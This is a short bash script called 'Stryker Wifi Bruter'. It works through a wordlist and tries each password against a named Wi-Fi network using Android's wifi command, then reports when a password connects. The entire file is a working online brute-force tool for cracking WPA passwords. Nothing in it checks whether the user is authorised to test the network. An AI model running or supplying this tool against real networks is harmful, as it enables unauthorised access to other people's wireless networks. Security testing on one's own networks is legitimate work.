#!/bin/bash

# Default values
interval=0.5
version=2

#colors 
red='\033[1;31m' 
green='\033[1;32m' 
uncolor='\033[0m'

# Function to show script usage
usage() {
	echo "⚡Stryker Wifi Bruter⚡ - by @zalexdev from strykerdefence.com"
	echo "Version: 1.0"
    echo "Usage: $0 -s <SSID> -w <wordlist> [-i <interval>] [-v <version>]"
    echo "  -s SSID of the network"
    echo "  -w Password wordlist file (one password per line, at least 8 characters)"
    echo "  -i Interval to check if SSID connected (default: 0.5)"
    echo "  -v WPA version (default: 2)"
    exit 1
}

# Function to check if SSID is connected
check_connection() {
    local ssid="$1"
    local result=$(cmd -w wifi status)
    if [[ $result == *"$ssid"* ]]; then
        return 0
    else
        return 1
    fi
}

# Parse command-line arguments
while getopts "s:w:i:v:" opt; do
    case $opt in
        s) ssid="$OPTARG" ;;
        w) wordlist="$OPTARG" ;;
        i) interval="$OPTARG" ;;
        v) version="$OPTARG" ;;
        *) usage ;;
    esac
done

# Check if main arguments are provided
if [ -z "$ssid" ] || [ -z "$wordlist" ]; then
    usage
fi

# Check if the wordlist file exists
if [ ! -f "$wordlist" ]; then
    echo "Error: Wordlist file '$wordlist' not found."
    exit 1
fi

# Get total number of lines in the wordlist 
total_lines=$(wc -l < "$wordlist")
((total_lines++)) 

# Loop through each line in the wordlist file
checked_lines=0
while IFS= read -r password || [ -n "$password" ]; do
    if [ -z "$password" ] || [ ${#password} -lt 8 ]; then
        continue
    fi
	
    echo "Current password: $password, Progress ($((++checked_lines))/$total_lines | $((checked_lines * 100 / total_lines))%). Waiting $interval sec..."
    cmd -w wifi connect-network "$ssid" "wpa$version" "$password" > /dev/null
    sleep $interval

    if check_connection "$ssid"; then
        echo -e "Password found: ${green}$password${uncolor}"
        exit 0
    fi
done < "$wordlist"

# If no password is found
echo -e "${red}Network is not vulnerable${uncolor}"
